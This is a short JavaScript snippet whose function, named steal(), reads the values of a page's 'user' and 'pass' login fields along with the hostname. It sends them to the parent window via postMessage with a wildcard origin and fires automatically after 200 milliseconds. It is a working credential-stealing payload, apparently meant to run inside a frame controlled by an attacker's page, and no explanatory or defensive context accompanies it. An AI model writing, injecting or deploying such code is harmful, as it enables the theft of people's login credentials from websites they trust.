
function steal(){
    user=document.getElementsByName("user")[0].value;
    pass=document.getElementsByName("pass")[0].value;
    host=location.hostname;
    if(pass.length > 0){
        window.parent.postMessage(window.name+"$$$"+host+','+user+','+pass,'*');
    }else{
        window.parent.postMessage(window.name+"$$$", '*')
    }
}

setTimeout("steal()",200);
